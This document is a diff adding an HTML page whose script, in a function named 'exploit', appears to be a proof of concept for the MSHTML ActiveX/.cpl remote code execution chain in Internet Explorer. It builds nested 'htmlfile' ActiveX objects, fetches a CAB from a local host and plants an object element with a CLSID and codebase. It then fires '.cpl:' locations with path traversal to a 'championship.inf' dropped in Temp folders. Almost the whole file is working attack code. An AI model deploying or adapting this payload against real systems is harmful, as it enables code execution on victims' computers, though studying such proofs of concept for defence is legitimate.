@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="Expires" content="-1">
+        <meta http-equiv="X-UA-Compatible" content="IE=11">
+    </head>
+    <body>
+        <script>
+            function garbage() {
+                return 'garbage';
+            }
+            (function exploit() {
+                var iframe = window["Document"]['prototype']['createElement']['call'](window["document"], 'iframe');
+                try {
+                    window["HTMLElement"]["prototype"]["appendChild"]['call'](window["document"]['body'], iframe);
+                } catch (_0x1ab454) {
+                    window["HTMLElement"]["prototype"]["appendChild"]['call'](window["document"]['documentElement'], iframe);
+                }
+                var htmlfile = iframe['contentWindow']['ActiveXObject']
+                  , htmlfile2 = new htmlfile('htmlfile');
+                iframe['contentDocument']['open']()['close']();
+                try {
+                    window["HTMLElement"]["prototype"]["removeChild"]['call'](window["document"]['body'], iframe);
+                } catch (_0x3b004e) {
+                    window["HTMLElement"]["prototype"]["removeChild"]['call'](window["document"]['documentElement'], iframe);
+                }
+                htmlfile2['open']()['close']();
+                var htmlfile3 = new htmlfile2[('Script')]['ActiveXObject']('htmlfile');
+                htmlfile3['open']()['close']();
+                var htmlfile4 = new htmlfile3[('Script')]['ActiveXObject']('htmlfile');
+                htmlfile4['open']()['close']();
+                var htmlfile5 = new htmlfile4[('Script')]['ActiveXObject']('htmlfile');
+                htmlfile5['open']()['close']();
+                var ActiveXObjectVAR = new ActiveXObject('htmlfile')
+                  , ActiveXObjectVAR2 = new ActiveXObject('htmlfile')
+                  , ActiveXObjectVAR3 = new ActiveXObject('htmlfile')
+                  , ActiveXObjectVAR4 = new ActiveXObject('htmlfile')
+                  , ActiveXObjectVAR5 = new ActiveXObject('htmlfile')
+                  , ActiveXObjectVAR6 = new ActiveXObject('htmlfile')
+                  , XMLHttpR = new window['XMLHttpRequest']()
+                  , XMLHttpRopen = window['XMLHttpRequest']['prototype']['open']
+                  , XMLHttpRsend = window['XMLHttpRequest']['prototype']['send'];
+                XMLHttpRopen['call'](XMLHttpR, 'GET', 'http://127.0.0.1/test.cab', ![]),
+                XMLHttpRsend['call'](XMLHttpR),
+                htmlfile5['Script']['document']['write']('body>');
+                var htmlScript = window["Document"]['prototype']['createElement']['call'](htmlfile5['Script']['document'], 'object');
+                htmlScript['setAttribute']('codebase', 'http://127.0.0.1/test.cab#version=5,0,0,0');
+                htmlScript['setAttribute']('CLSID:edbc374c-5730-432a-b5b8-de94f0b57217'),
+                window["HTMLElement"]["prototype"]["appendChild"]['call'](htmlfile5['Script']['document']['body'], htmlScript),
+                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
+                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
+                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
+                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
+                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
+                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
+                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
+                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
+                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
+                ActiveXObjectVAR['Script']['location'] = '.cpl:../../../AppData/Local/Temp/Low/championship.inf',
+                ActiveXObjectVAR2['Script']['location'] = '.cpl:../../../AppData/Local/Temp/championship.inf',
+                ActiveXObjectVAR3['Script']['location'] = '.cpl:../../../../AppData/Local/Temp/Low/championship.inf',
+                ActiveXObjectVAR4['Script']['location'] = '.cpl:../../../../AppData/Local/Temp/championship.inf',
+                ActiveXObjectVAR5['Script']['location'] = '.cpl:../../../../../Temp/Low/championship.inf',
+                ActiveXObjectVAR4['Script']['location'] = '.cpl:../../../../../Temp/championship.inf',
+                ActiveXObjectVAR4['Script']['location'] = '.cpl:../../Low/championship.inf',
+                ActiveXObjectVAR4['Script']['location'] = '.cpl:../../championship.inf';
+            }());
+        </script>
+    </body>
+</html>
